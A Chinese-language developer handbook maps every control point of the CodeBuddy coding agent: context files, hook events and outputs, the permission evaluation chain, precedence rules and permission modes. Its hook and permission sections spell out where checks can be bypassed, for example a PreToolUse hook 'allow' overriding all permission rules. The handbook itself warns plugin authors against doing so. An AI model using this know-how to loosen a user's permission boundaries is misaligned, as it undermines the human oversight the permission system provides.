# CodeBuddy 过程控制点全景手册

> 目标：穷举 CodeBuddy 中「能干预 Agent 执行过程」的所有可配置点，并明确**哪些是开发者（尤其是插件开发者）可以参与配置的**。
> 依据：CodeBuddy Code CLI 官方文档（plugins-reference / plugins / hooks / memory / settings / permissions / skills / sub-agents / slash-commands / workflows / agent-teams / channels / worktree / codebuddy-dir / env-vars / cli-reference / sdk-*）+ CodeBuddy IDE 官方文档实抓。

---

## 0. 可配置主体标记（全文通用）

| 标记 | 含义 | 落盘位置 | 谁能改 |
| :--- | :--- | :--- | :--- |
| **P** | **插件可分发**——开发者写在插件里，用户装上就生效 | 插件根目录 | 插件开发者 ✅ |
| **J** | **项目级**——随仓库提交，对全团队生效 | `.codebuddy/` | 仓库维护者 ✅ |
| **L** | **项目本地**——被 gitignore，只对本机生效 | `.codebuddy/settings.local.json`、`CODEBUDDY.local.md` | 使用者本人 |
| **U** | **用户级**——跨项目，只对本人生效 | `~/.codebuddy/` | 使用者本人 |
| **C** | **运行时**——CLI 参数 / 环境变量，进程级 | 命令行 | 调用方（CI 脚本可控）✅ |
| **E** | **企业/托管策略**——集中下发，优先级最高 | 托管设置文件 | 管理员 |
| **X** | **开发者不可配**——UI 交互动作、产品内置或必须由用户本人开启 | — | ❌ |

一句话结论：**插件（P）能覆盖「上下文注入 / 事件拦截 / 能力封装 / 外部接入」四类控制；「权限边界 / 沙箱 / 信任」这类安全语义，产品刻意不让插件夺权，必须由 J / L / U / C 配置。**

---

## 1. 总览与全景图

### 1.1 五类控制点 × 可配置主体

| # | 控制类别 | 代表控制点 | 插件可配 | 备注 |
| :-- | :--- | :--- | :--- | :--- |
| 1 | **上下文注入** | `CODEBUDDY.md`、`.codebuddy/rules/*.md`、Auto Memory、output-styles、`--append-system-prompt` | 部分 | rules/CODEBUDDY.md 是 J/U，插件只能通过 skills/agents/output-styles 注入 |
| 2 | **事件拦截（真正的"过程控制"）** | `hooks/hooks.json` 24 个生命周期事件 | ✅ 完整 | 插件 hooks 不受 `allowUntrustedFrontmatterHooks` 闸门限制 |
| 3 | **权限与边界** | `permissions.allow/ask/deny`、权限模式、`sandbox.*`、`autoMode` | ❌ 大部分 | 插件 `settings.json` 当前运行时仅 `agent` 键生效 |
| 4 | **能力封装** | skills、agents、commands、MCP、LSP、`bin/` | ✅ 完整 | 插件的主场 |
| 5 | **任务编排** | workflows、agent-teams、`/goal`、cron、channels、worktree | 部分 | workflows/channels 可随插件分发；`/goal`、`--worktree` 属运行时 |

---

### 1.2 全景图：控制点的加载时机（泳道 × 时间轴）

竖轴 = 会话生命周期，横向 = 四条泳道（**配置层** / **扩展层** / **上下文层** / **Hook 事件层**）。
标记：`[P]` 插件可配　`[J]` 项目级　`[U]` 用户级　`[C]` CLI/环境变量　`①…⑨` 权限求值链阶段。

```
时刻          配置层                    扩展层                  上下文层                Hook 事件
──────────────────────────────────────────────────────────────────────────────────────────────────
T0  进程启动   环境变量 [C]               ——                     ——                     ——
    ↓         CLI 参数 [C]
              --settings/--setting-sources
              --permission-mode/--tools
              --plugin-dir/--worktree

T1  配置装配   settings 四层合并          ——                     ——                     （Setup?)
    ↓         CLI > local > project      目录信任检查
              > user > 产品内置           trustedDirectories [U]
              ⚠️ 权限规则用另一套顺序
              （见 1.4-B）
              ★ hooks 在此刻拍快照
                外部再改需 /hooks 审查

T2  扩展发现   enabledPlugins [P/J/U]     插件加载 [P]            ——                     ——
    ↓         defaultEnabled             ├ hooks/hooks.json [P]
              userConfig 提示填值 [P]     ├ skills/ agents/ commands/ [P]
                                         ├ .mcp.json [P] / .lsp.json [P]
                                         ├ bin/ → 注入 Bash PATH [P]
                                         └ settings.json（仅 agent 键生效）[P]
                                        项目/用户扩展
                                         ├ .codebuddy/agents|skills|commands [J/U]
                                         └ .mcp.json 需审批
                                           enableAllProjectMcpServers [U]
                                        LSP / MCP 进程启动
                                        组件同名优先级：项目 > 用户 > 插件

T3  上下文装配  ——                        主 agent 选定            记忆按 6 步加载          ——
    ↓                                   product.json default     ① ~/.codebuddy/CODEBUDDY.md [U]
                                        → plugin agent [P]       ② ~/.codebuddy/rules/**.md [U]
                                        → settings.agent [U]     ③ CODEBUDDY.md（cwd 向上递归）[J]
                                        → --agent [C]            ④ .codebuddy/rules/**.md（仅 cwd）[J]
                                        （越后越高）               ⑤ CODEBUDDY.local.md [L]
                                        outputStyle [P/U]        ⑥ 子目录 CODEBUDDY.md ⇒ 延后到 T5
                                        --append-system-prompt   Auto Memory: MEMORY.md 前 200 行 [U]
                                          [C]                    skills 只装 name+description（渐进披露）

T4  会话开启   ——                        statusLine 脚本 [U]      SessionStart 的 stdout /  ▶ SessionStart
    ↓                                                            additionalContext 进上下文   matcher: startup
                                                                                             /resume/clear/compact

╔═══════════════ 每轮循环（用户提问 → 模型响应）═════════════════════════════════════════════╗
T5  用户提交   ——                        ——                      UserPromptSubmit 注入     ▶ UserPromptSubmit
    ↓                                                            additionalContext [P]        可 continue:false 阻断

T6  模型决策   ——                        skill 正文按需展开        条件规则触发注入：         ▶ InstructionsLoaded
    ↓                                   Agent/Skill 调度          alwaysApply:false + paths     （规则载入可观测）
                                                                 命中 @引用 或 文件类工具
                                                                 ⇒ 作为 system-reminder 注入
                                                                 **同一规则只注入一次**
                                                                 子目录 CODEBUDDY.md 此刻才载入

T7  工具调用   permissions 求值链         ——                      ——                      ▶ PreToolUse（可 allow/
    ↓         ⓿ Hook 裁决 ← 最高                                                            deny/ask/改 modifiedInput）
              ❶ deny（任一作用域即拒）                                                      ▶ PermissionRequest
              ❷ 可信 allow                                                                 ▶ PermissionDenied
              ❸ 危险命令检查                                                                 （可回 retry:true）
              ❹ ask                                                                        —— 执行 ——
              ❺ bypass 短路                                                                ▶ PostToolUse（可 updated-
              ❻ 不可信 allow                                                                 ToolOutput 替换结果）
              ❼ 权限模式基线                                                                ▶ PostToolUseFailure
              ❽ 非交互兜底 ask→deny                                                         ▶ FileChanged / CwdChanged
              ❾ dontAsk / auto 收口                                                         ▶ ConfigChange

T8  子代理     subagentPermissionMode     agent frontmatter 生效   子代理独立上下文窗口      ▶ SubagentStart
    ↓         [U] / Agent(mode) 入参      tools/model/effort/      memory: user|project|local  ▶（frontmatter hooks
              （插件 agent 不能带           maxTurns/isolation [P]                              注册进 ScopedHook-
                permissionMode）          worktree 隔离                                        Registry，退出即注销）
                                                                                             ▶ TaskCreated/TaskCompleted
                                                                                             ▶ TeammateIdle
                                                                                             ▶ WorktreeCreate/Remove
                                                                                             ▶ SubagentStop
                                                                                               （frontmatter 的 Stop
                                                                                                自动重写到这里）

T9  上下文满   autoCompactEnabled [U]     ——                      压缩摘要替换历史          ▶ PreCompact（可阻断）
    ↓         autoCompactWindow                                                            ▶ PostCompact（仅观测）

T10 轮次结束   ——                        ——                      reason 以 isMeta=true     ▶ Stop（可 continue:false
    ↓                                                             注入 history ⇒ 回到 T6      迫使继续）→ 回 T6
╚═════════════════════════════════════════════════════════════════════════════════════════════╝
                                                                                           ▶ StopFailure（输出被忽略）

T11 会话结束   cleanupPeriodDays [U]      worktree keep/remove     transcript 落盘           ▶ SessionEnd
                                         插件数据目录保留            checkpoint 供 /rewind      matcher: clear/logout/
                                         （卸载最后作用域才删）                                prompt_input_exit/other
```

**读图要点：**

- **T1 是分水岭**：hooks 在这一刻拍快照，之后外部修改设置文件不会自动生效——必须在 `/hooks` 菜单审查后应用。想在运行中调 hook，只能改 hook 脚本内容（脚本每次都是新进程），不能改 hooks 注册表。
- **T2 决定"谁在场"，T7 决定"谁说话"**：插件的 hooks 在 T2 一次性注册进整个会话；子代理 frontmatter hooks 则在 T8 才注册、退出即注销（`ScopedHookRegistry`）。
- **条件规则不在 T3 生效**：`alwaysApply: false + paths` 的规则启动时**不进上下文**，要等 T6 命中文件操作才注入，且注入过就不再重复。想让规则必然被看到，就别用条件规则。
- **T7 的 ⓿ 在 ❶ 之前**：这是 hook 能力最强的地方，也是最该自律的地方（详见 §3.6）。
- **T10 可以回跳 T6**：`Stop` hook 返回 `continue:false` 或 prompt hook 的 `{ok:false}` 会把 `reason` 注入 history 形成迭代循环，`/goal` 就是这条链路的封装。

---

### 1.3 加载时机与热更新对照表

| 控制点 | 加载时机 | 运行中如何更新 |
| :--- | :--- | :--- |
| 环境变量 / CLI 参数 | T0，进程级 | ❌ 只能重启 |
| `settings.json` 四层 | T1 合并 | 部分键需重启；`/config set`、`/model`、`/output-style` 立即生效 |
| `hooks` 注册表 | **T1 快照** | `/hooks` 菜单审查后应用；外部改动会告警 |
| `model`、`outputStyle` | T1/T3 | 直接编辑文件对**已开启会话不生效**，需重启或 `/clear` 新建会话；面板切换立即生效 |
| 插件（含其 skills/agents/commands/hooks/MCP/LSP） | T2 | ✅ **`/reload-plugins`** 一并重载 |
| 项目/用户 skills、agents、commands | T2 | `/reload-plugins`（新增文件建议重启确认） |
| 项目 `.mcp.json` | T2，**需审批** | `enableAllProjectMcpServers` / `enabledMcpjsonServers` / `disabledMcpjsonServers` 预置决策 |
| `bin/` 注入 PATH | T2，插件启用时 | 随 `/reload-plugins` |
| `CODEBUDDY.md` / `rules/*.md` | T3 | ❌ **手动改文件、增删规则文件都不热生效，需重启**；`/memory` 面板内编辑会清缓存 |
| 子目录 `CODEBUDDY.md` | **T6 动态**，触碰该子树文件时 | 自动 |
| 条件规则（`paths` 命中） | **T6 动态**，注入一次不重复 | 自动 |
| Auto Memory `MEMORY.md` | T3（前 200 行） | Agent 自主写入；`/memory` 面板管理 |
| statusLine 脚本 | T4 起每次刷新调用 | 改脚本即生效（每次新进程） |
| 主 agent 选择 | T3 | `--agent` / settings；插件 agent 会被用户设置和 CLI 覆盖 |
| 子代理 frontmatter hooks | **T8 注册 / 退出注销** | 受 `allowUntrustedFrontmatterHooks` 闸门 |
| `/goal` 条件 | 运行中随时 | `/goal <cond>` / `/goal clear`；`--resume` 保留 |
| 定时任务 | 运行中随时 | 会话级，退出即失效；仅空闲触发 |
| 热重载总开关 | — | `CODEBUDDY_DISABLE_HOT_RELOAD` |
| 配置漂移感知 | — | `ConfigChange` hook（会话期间配置文件变更时触发） |

---

### 1.4 优先级速查：一共有六套，别互相套用

**A. 通用 settings 合并**（`codebuddy-dir.md`）

```
CLI 参数 > .codebuddy/settings.local.json > .codebuddy/settings.json
        > ~/.codebuddy/settings.json > 产品内置默认
```

**B. 权限规则来源**（`permissions.md`）— ⚠️ **与 A 不同，`user` 反而高于 `project`/`local`**

```
flagSettings / cliArg / session > userSettings > policySettings
        > projectSettings > localSettings > command / sandbox 来源
```

> 这不是文档笔误，是刻意的安全设计：**防止恶意仓库把 settings 提交进来后悄悄放宽你本地的安全边界**。同理，未信任目录下仓库内的 `allow` 规则只算"不可信 allow"，不能越过危险命令检查。
> 而且官方强调**评估顺序比来源优先级更重要**：`deny` 从所有作用域合并，**任一作用域 deny 即拒**。

**C. 组件（agents / skills / rules）**

```
项目级 > 用户级 > 插件级       同名时项目级覆盖
```

**D. 主线程 agent**（越靠后越高）

```
product.json default → plugin agent → settings.json agent → CLI --agent
```

**E. `variantModels`（lite / reasoning）**— 这里又变成 project > user

```
变体环境变量 > 项目设置 > 用户全局设置 > 主模型 relatedModels > 产品内置默认 > 主模型
```

**F. 子代理模型**

```
CODEBUDDY_CODE_SUBAGENT_MODEL > 本次调用入参 > 项目 subagents.agents.<name>.model
        > 全局同键 > 内置声明 > 继承主对话模型
```

> 记忆口诀：**普通配置"越近越大"（local 赢），安全配置"越个人越大"（user 赢）**。插件永远在最底层——所以插件应该做"合理默认值"，不要做"强制约束"。

---

## 2. 上下文注入类控制点

控制「模型看到什么」，是最便宜的过程控制手段。

| 控制点 | 精确路径 / 字段 | 能控制什么 | 主体 |
| :--- | :--- | :--- | :--- |
| 用户记忆 | `~/.codebuddy/CODEBUDDY.md` | 全项目个人偏好 | U |
| 用户规则 | `~/.codebuddy/rules/*.md` | 模块化个人规则 | U |
| 项目记忆 | `./CODEBUDDY.md` 或 `./.codebuddy/CODEBUDDY.md`（无则回退 `AGENTS.md`） | 团队共享指令、架构约定 | **J** |
| 项目规则 | `./.codebuddy/rules/**/*.md`（递归、支持符号链接） | 按主题拆分的团队规则 | **J** |
| 本地记忆 | `./CODEBUDDY.local.md`（自动进 .gitignore） | 个人的项目内偏好 | L |
| 子目录记忆 | 子树中的 `CODEBUDDY.md` | 仅当 Agent 触碰该子树文件时才加载 | J |
| **规则控制字段** | frontmatter `enabled`(bool, 默认 true) / `alwaysApply`(bool, 默认 true) / `paths`(glob，启用 matchBase) | `alwaysApply:false + paths` = 条件触发规则（仅操作匹配文件时注入）；`alwaysApply:false` 无 `paths` = 不加载 | **J/U** |
| 记忆导入 | `@path/to/file`，递归深度上限 5；代码块内不解析 | 拆分大规范文档 | J/U |
| Auto Memory | `~/.codebuddy/memories/{project-id}/MEMORY.md`（前 200 行自动入上下文）、`global/`；开关 `memory.autoMemoryEnabled`、`memory.typedMemory`、`CODEBUDDY_DISABLE_AUTO_MEMORY=1` | 跨会话自主记忆；Typed Memory 4 类型 `user`/`feedback`/`project`/`reference` | U/L |
| Output styles | 插件 `output-styles/*.md`（清单字段 `outputStyles`）；设置键 `outputStyle` | 替换/调整输出风格与系统提示基调 | **P** + U |
| 系统提示追加 | `--append-system-prompt "<text>"` | 进程级注入硬约束，CI 最常用 | **C** |
| 启动期注入 | `SessionStart` hook 的 stdout / `hookSpecificOutput.additionalContext` | 开会话即注入环境信息 | **P** |
| 每轮注入 | `UserPromptSubmit` hook 的 stdout / `additionalContext` | 每次用户提问前追加上下文 | **P** |
| 工具后注入 | `PostToolUse` 的 `additionalContext` | 把 lint/测试结果回灌给模型 | **P** |
| 规则加载可观测 | `InstructionsLoaded` hook（CODEBUDDY.md / rules 载入时触发） | 审计"这次到底加载了哪些规则" | **P** |

⚠️ 缓存语义：**手动改文件、增删规则文件都不会热生效**，需重启；`/memory` 面板内编辑会自动清缓存；`/clear` 只清消息历史。

---

## 3. 事件拦截类：Hooks（开发者最强的过程控制入口）

### 3.1 三条 Hook 注入通道（决定"谁能配"）

| 通道 | 位置 | 作用域 | 安全闸门 | 主体 |
| :--- | :--- | :--- | :--- | :--- |
| 插件 hooks | 插件 `hooks/hooks.json`，或 `plugin.json` 的 `hooks` 字段（路径/数组/内联对象） | 整个会话（插件启用即生效） | **不受** `allowUntrustedFrontmatterHooks` 约束 | **P ✅** |
| 设置 hooks | `~/.codebuddy/settings.json`、`.codebuddy/settings.json`、`.codebuddy/settings.local.json`、企业策略文件的 `hooks` 键 | 整个会话 | 无 | J/L/U/E |
| Frontmatter hooks | `agents/*.md` 或 `skills/SKILL.md`（仅 `context: fork`）的 `hooks` frontmatter | 仅该 subagent / fork skill 生命周期，退出自动注销 | **默认拒绝**，需用户在 `~/.codebuddy/settings.json` 设 `allowUntrustedFrontmatterHooks: true` | P（但需用户开闸）|

关键规则：
- 多来源同事件 hooks **合并叠加、并行执行**，不互相覆盖。
- frontmatter 里写 `Stop` 会被**自动重写为 `SubagentStop`**。
- 插件 hooks 用 `${CODEBUDDY_PLUGIN_ROOT}` 引用自带脚本；脚本要 `chmod +x`。
- 直接编辑设置文件中的 hooks 不立即生效：启动时快照，需在 `/hooks` 菜单审查后应用。
- 全局关闭：`disableAllHooks`（设置键）。

### 3.2 全部生命周期事件（24 个）

| 事件 | 触发时机 | matcher | 可否阻断 |
| :--- | :--- | :--- | :--- |
| `SessionStart` | 会话开始/恢复 | `startup`/`resume`/`clear`/`compact` | 否（可注入上下文） |
| `UserPromptSubmit` | 用户提交、模型处理前 | 不支持 | **可阻断**（`continue:false`）+ 可注入 |
| `PreToolUse` | 工具执行前 | 工具名正则 | **可阻断 / 改写入参** |
| `PermissionRequest` | 权限对话框弹出时 | — | 观测/介入权限流 |
| `PermissionDenied` | 被 auto 模式分类器拒绝时 | — | 返回 `{retry:true}` 告知模型可重试 |
| `PostToolUse` | 工具成功后 | 工具名正则 | 不可阻断，但**可替换结果** |
| `PostToolUseFailure` | 工具失败后 | 工具名正则 | 补充错误上下文 |
| `Notification` | 权限请求 / 60s 空闲等通知 | `permission_prompt`/`idle_prompt`/`auth_success`/`elicitation_dialog` | 否（外发通知） |
| `SubagentStart` / `SubagentStop` | 子代理启停 | — | SubagentStop **可阻断**（让子代理继续） |
| `TaskCreated` / `TaskCompleted` | TaskCreate 创建 / 任务完成 | — | 任务流水线审计 |
| `Stop` | 主 Agent 响应结束 | 不支持 | **可阻断**（强制继续工作） |
| `StopFailure` | 轮次因 API 错误结束 | — | 输出与退出码被忽略 |
| `TeammateIdle` | 团队成员即将空闲 | — | 团队调度 |
| `InstructionsLoaded` | CODEBUDDY.md / rules 载入上下文 | — | 规则加载审计 |
| `ConfigChange` | 会话期间配置文件变更 | — | 配置漂移告警 |
| `CwdChanged` | 工作目录变更（如模型 `cd`） | — | 越界检测 |
| `FileChanged` | 被监视文件磁盘变更 | **matcher = 文件名** | 外部改动响应 |
| `WorktreeCreate` / `WorktreeRemove` | worktree 创建/移除 | — | 隔离环境准备与清理 |
| `PreCompact` | 上下文压缩前 | `manual`/`auto` | **可阻断压缩** |
| `PostCompact` | 压缩完成后 | 不支持 | 仅观测（`compact_summary`） |
| `Elicitation` / `ElicitationResult` | MCP 请求用户输入 / 用户已响应待回传 | — | 介入 MCP 交互 |
| `SessionEnd` | 会话终止 | `clear`/`logout`/`prompt_input_exit`/`other` | 否（清理/落盘） |

### 3.3 四种 Hook 类型

| `type` | 关键字段 | 适用 | 主体 |
| :--- | :--- | :--- | :--- |
| `command` | `command`、`timeout`(秒，默认 60)、`once` | 确定性规则；stdin 收 JSON，用 `jq` 取字段 | **P** |
| `prompt` | `prompt`（含 `$ARGUMENTS`）、`timeout`(默认 30)、`continueOnBlock` | 语义判定，走 `lite` 小模型；**仅 `Stop`/`UserPromptSubmit`/`PreToolUse`** | **P** |
| `agent` | 代理验证器 | 复杂多步验证 | **P** |
| `http` | `url`、`method`(POST/PUT/PATCH) | 把事件 JSON 投递到外部服务 | **P** |

### 3.4 Hook 的决策输出（过程控制的"方向盘"）

**退出码通道**：`0` 成功（`UserPromptSubmit`/`SessionStart` 的 stdout 进上下文）；`2` 阻断（消息优先取 stdout，**stderr 仅作 fallback**，所以调试日志写 stderr 是安全的）；其他码 = 非阻断错误。

**JSON 通道（stdout）**：

| 字段 | 作用 |
| :--- | :--- |
| `continue`(bool) / `stopReason` / `reason` | 是否继续；`reason` 传给 Agent |
| `suppressOutput` / `systemMessage` | 隐藏 transcript 输出 / 只给用户看的告警 |
| `hookSpecificOutput.permissionDecision` = `allow`/`deny`/`ask` + `permissionDecisionReason` | **PreToolUse 三态裁决**，`allow` 直接绕过权限系统 |
| `hookSpecificOutput.modifiedInput` | **执行前改写工具入参**（部分字段覆盖） |
| `hookSpecificOutput.additionalContext` | 追加上下文（PostToolUse / UserPromptSubmit / SessionStart） |
| `hookSpecificOutput.updatedToolOutput` | **替换**工具结果，对内置与 MCP 工具都生效；压缩超长输出省 token 靠它 |
| prompt hook 响应 `{ok, reason, impossible}` | `ok:false` 时 `reason` 以 `isMeta=true` 内部 user message 注入 history，驱动多轮收敛（`/goal` 底层机制） |

**Hook 输入公共字段**：`session_id`、`transcript_path`、`cwd`、`permission_mode`、`hook_event_name`、`generation_id`（同一轮内跨事件共享）。

**执行环境**：默认超时 60s；同事件并行 + 自动去重；macOS/Linux 用 `$SHELL`，**Windows 强制 Git Bash**（可用 `CODEBUDDY_CODE_GIT_BASH_PATH`、`CODEBUDDY_CODE_SHELL` 调整）；可用 `$CODEBUDDY_PROJECT_DIR`。

---

### 3.5 执行模型：一次事件触发时到底发生了什么

```
事件触发
  ↓
① 收集候选 hooks（5 个来源同时参与，无先后之分）
    ~/.codebuddy/settings.json          (user)
    .codebuddy/settings.json            (project)
    .codebuddy/settings.local.json      (local)
    企业策略文件                          (policy)
    插件 hooks/hooks.json                (每个已启用插件各一份)
    + ScopedHookRegistry 里当前活跃的 frontmatter hooks（仅对应 subagent 的事件）
  ↓
② 闸门过滤：disableAllHooks 全局关；allowUntrustedFrontmatterHooks 拦非内置 frontmatter hooks
  ↓
③ 条件过滤：matcher 正则（大小写敏感）→ 字段 if（按工具名/参数）→ once（已成功过则移除）
  ↓
④ 去重：settings 跨 scope 的同一 command 折叠成一份；
        不同插件 / 不同子 agent scope 各自保留一份（v2.98.0 起）
  ↓
⑤ 并行执行 —— ⚠️ 无顺序保证，不能依赖谁先谁后
  ↓
⑥ 汇总决策（见 3.7）
```

**去重规则的实际含义**（这是最容易踩的坑）：

| 场景 | 是否会重复触发 |
| :--- | :--- |
| 同一条 `command` 同时写在 user 和 project settings | ❌ 折叠成一份，只跑一次 |
| 同一条 `command` 同时来自插件 A 和 user settings | ✅ 跑两次（不同 scope） |
| 两个插件各自装了同一个格式化脚本 | ✅ 跑两次 |
| 主会话 hook + 子 agent frontmatter hook 命中同一事件 | ✅ 各自触发（用 payload 的 `agent_id` / `agent_type` 区分） |

**可观测性**：同一事件命中 ≥ 2 条不同 hook 时，日志会列出所有命中命令，专门用来自查冲突（v2.98.0）。配合 `CODEBUDDY_DEBUG=1` 可看到 `[ScopedHookRegistry] registered N hook config(s) for scope '<sessionId>'`。

---

### 3.6 Hook 在权限求值链中的位置（阶段 0，最高优先）

每次工具调用走的是一条**分层求值链**，hook 位于最前面的阶段 0：

| 阶段 | 检查项 | 命中后行为 |
| :-- | :--- | :--- |
| **0** | **Hooks / 交互型工具特例** | **`PreToolUse` 可直接 allow / deny / ask** |
| 1 | `deny` 规则 | 立刻拒绝，规则层最高优先 |
| 2 | **可信** allow（user / CLI / session / policy / 已信任项目规则 / `--allowedTools`） | 放行，且**可越过交互态危险命令检查** |
| 3 | 命令安全检查（仅交互式） | 高危 Bash 强制进 ask |
| 4 | `ask` 规则 | 强制 ask |
| 5 | `bypassPermissions` 短路 | 放行大多数动作 |
| 6 | **不可信** allow（未信任项目规则、command / sandbox 来源） | 放行，但**不能**越过阶段 3 |
| 7 | 权限模式基线策略 | 由当前模式决定默认 allow 还是 ask |
| 8 | 非交互兜底 | 无法弹框时把未决 `ask` 转成 `deny` |
| 9 | `dontAsk` / `auto` 收口 | `dontAsk` 把 ask 改写为 deny；`auto` 只接管 ask 并交给分类器 |

由此推出的关键结论：

- **`PreToolUse` 的 `permissionDecision` 先于所有常规权限规则生效**——`allow` 会**绕过整个权限系统**，`deny` 直接拒，`ask` 强制弹框。
- **exit code 2 也能在常规 allow 规则前短路**，所以可以"settings 里放行 `Bash` 全部，再用 hook 单独拦几条命令"。
- ⚠️ 反过来说：**hook 的 `allow` 会削弱用户自己设的安全边界**。官方明确建议：**需要无条件硬边界时用 `permissions.deny`**，因为它能在 `/permissions` 面板和 settings 里被统一审计，而 hook 里的判定是黑盒。插件开发者尤其不该用 hook `allow` 替用户"提权"。
- `auto` 模式的分类器不接管显式 `ask` 规则；被分类器拒绝时会触发 `PermissionDenied` hook，可返回 `{retry: true}` 告知模型可重试。
- 另一处 hook 抢占产品默认行为的例子：**配置了 `WorktreeCreate` hook 后，即使在 Git 仓库中也走 hook，不走 `git worktree`**（Hook 优先于 Git）；要恢复就删掉该 hook 配置。

---

### 3.7 冲突解决机制：官方明确定义的 vs 未定义的

**已明确定义（可以放心依赖）：**

| 冲突场景 | 结论 |
| :--- | :--- |
| 同事件多来源（settings 各 scope / 插件 / frontmatter） | **合并叠加，全部并行触发，不存在覆盖** |
| 同一 `command` 跨 settings scope 重复 | 折叠成一份 |
| 同一 hook 内同时返回 `updatedToolOutput` + `additionalContext` | **先替换，再把 additionalContext 追加到替换后的内容上** |
| exit 2 的消息来源 | **stdout 优先（JSON 的 `reason`/`stopReason` 或纯文本）> stderr 仅作 fallback** → 调试日志写 stderr 是安全的 |
| frontmatter 里写 `Stop` | 自动重写为 `SubagentStop`，不会误触发主会话 Stop |
| Stop hook 阻断后的死循环 | 由 payload 的 `stop_hook_active: true` 标识，hook 自己据此收敛 |
| 单条 hook 超时 | 只取消该条（command 默认 60s，prompt 默认 30s），不影响同批其他 hook |
| 非 0 非 2 退出码 | 非阻断错误：stderr 给用户看，**执行继续** |
| `PostToolUse` 想阻止操作 | 做不到（工具已执行）；`decision: "block"` 已废弃 |
| `PostCompact` | 仅观测，不能阻止或修改压缩结果 |
| 规则 vs 模式 | **规则层先于模式层**：deny 先于任何 mode；显式 ask 先于 auto；dontAsk/bypassPermissions 都不抹掉前置规则 |

**官方文档未定义（不要依赖，需自行规避）：**

| 未定义场景 | 风险 | 规避做法 |
| :--- | :--- | :--- |
| 多个 `PreToolUse` 分别返回 `allow` / `deny` / `ask` | 并行执行 + 无顺序保证 ⇒ 最终采纳哪个**未文档化** | **单一裁决者原则**：一个事件上的互斥判定只交给一条 hook；硬边界改用 `permissions.deny` |
| 多个 `PostToolUse` 都返回 `updatedToolOutput` | 谁的替换生效未定义，可能互相覆盖 | 压缩类 hook 只保留一条；或改用 `additionalContext`（追加天然可叠加） |
| 多个 hook 都返回 `modifiedInput` 改同一字段 | 覆盖顺序未定义 | 同上，收敛到单条 |
| 多个 `Stop` hook 一个放行一个阻断 | 未文档化 | 用 `/goal` 或单条 prompt Stop hook 统一判定 |
| hook 与 `permissions` 规则语义相反 | 阶段 0 赢，但语义割裂、难审计 | 插件只做 `deny`/`ask` 收紧，不做 `allow` 放宽 |

> 结论一句话：**CodeBuddy 的 hooks 是"并行叠加 + 无序"模型，只有"是否触发"是确定的，"多方决策如何归并"没有承诺。** 所以过程控制的正确姿势是让每个决策点只有一个所有者，而不是靠优先级去博弈。

---

### 3.8 hooks.md 字段表未收录、但 release notes 已记载的字段

以下字段出自 v2.97.0 / v2.98.0 release notes，参考文档的字段表尚未补全。**上生产前请用 `CODEBUDDY_DEBUG=1` 实测确认当前版本是否支持**：

| 字段 / 能力 | 作用 |
| :--- | :--- |
| `if` | 按工具名/参数做二级匹配（比 `matcher` 更细） |
| `shell: bash \| powershell` | 切换执行 shell |
| `once: true` | 成功触发一次后自动移除 |
| `async: true` + `asyncTimeout: N`（hook 输出） | fire-and-forget，立即放行不阻塞主流程 |
| `asyncRewake` | 异步 hook 完成后回唤 |
| `allowedEnvVars` | 限定传给 hook 子进程的环境变量 |
| `statusMessage` | 执行时展示给用户的状态文案（多插件场景下强烈建议带上插件名，便于用户定位是谁在拦） |
| `agentType` / `model`（`type: agent`） | 指定验证用 subagent 与模型 |
| `watchPaths`（`FileChanged`） | 声明监视路径 |
| payload `agent_id` / `agent_type` | 区分主会话与子 agent 触发（v2.98.0 起所有事件补齐） |
| 占位符 `${CODEBUDDY_SKILL_DIR}`、`${CODEBUDDY_SESSION_ID}`、`${VAR:-默认值}` | `.md` 与 hook 配置中的变量替换；未设置的占位符原样保留 |
| `Setup` 事件 | v2.97.0 列在新增事件中，参考文档 24 事件表未收录 |

---

### 3.9 插件开发者的防冲突守则

1. **单一裁决者**：一个事件上只放一条会做 allow/deny/ask 或 `updatedToolOutput` 的 hook；其余 hook 只做观测与 `additionalContext`。
2. **只收紧不放宽**：插件 hook 用 `deny`/`ask`，不用 `allow`——别替用户绕过权限系统。硬边界引导用户写 `permissions.deny`。
3. **幂等 + 快速失败**：并行执行且可能重复触发（跨插件 scope 不去重），脚本必须幂等；非致命错误用非 2 退出码，不要误阻断别人的流程。
4. **带身份标识**：`statusMessage` 与日志前缀带插件名；用 payload 的 `agent_id`/`agent_type` 决定是否在子 agent 里跳过，避免子代理循环里重复跑重活。
5. **别抢产品默认行为**：`WorktreeCreate` 这类"配了就接管"的 hook，插件默认不要提供；确需提供时在 README 显式说明。
6. **调试日志走 stderr**：因为 exit 2 的消息优先取 stdout，stderr 只作 fallback，这样调试输出不会污染给模型的反馈。
7. **交付前跑一遍**：`codebuddy plugin validate` + `CODEBUDDY_DEBUG=1` + `/hooks` 面板确认注册情况（注意：直接改 settings 文件不即时生效，需在 `/hooks` 菜单审查后应用）。

---

## 4. 权限与边界类（插件基本无权，必须由项目/用户/CI 配置）

| 控制点 | 字段 / 位置 | 能控制什么 | 主体 |
| :--- | :--- | :--- | :--- |
| 权限规则 | `permissions.allow` / `.ask` / `.deny` | 工具级 + 参数级放行/询问/禁止 | J/L/U/E；**插件 ❌** |
| 规则语法 | `Bash(npm run *)`、`Bash(git:*)`、`Read(.env)`、`Edit(/src/**)`、`Read(//etc/hosts)`、`WebFetch(domain:example.com)`、`mcp__server__tool`、`mcp__*`、`Agent(Explore)`、`Skill(name)` | 精确到命令/路径/域名/单个 MCP 工具 | 同上 |
| 目录白名单 | `permissions.additionalDirectories` | 扩展可访问目录 | J/L/U |
| 默认模式 | `permissions.defaultMode` | 会话初始权限模式 | U/L；⚠️ 项目级设 `auto` 会被忽略 |
| 模式禁用 | `permissions.disableBypassPermissionsMode`、`disableAutoMode` | 禁止使用高危模式 | U/E |
| 子代理权限 | `permissions.subagentPermissionMode`、`--subagent-permission-mode`、`CODEBUDDY_SUBAGENT_PERMISSION_MODE` | 统一收紧子代理 | U/C |
| 权限模式（用户可切） | `default` / `acceptEdits` / `auto` / `dontAsk` / `plan` / `bypassPermissions` / **`delegate`**；`--permission-mode`、`Shift+Tab` 轮换 | 全局审批策略；`dontAsk` 适合 CI 白名单 | **C** + U |
| 权限模式（程序化，不在 Shift+Tab 循环） | `fullAccess`（IDE 协议传入，真正 full pass 含危险命令）、`work`（IDE 传入：Read 直接放行不查信任目录、Edit 一律询问、Bash 仅安全命令放行） | 由 IDE / 宿主客户端决定 | X（CLI 侧不可选） |
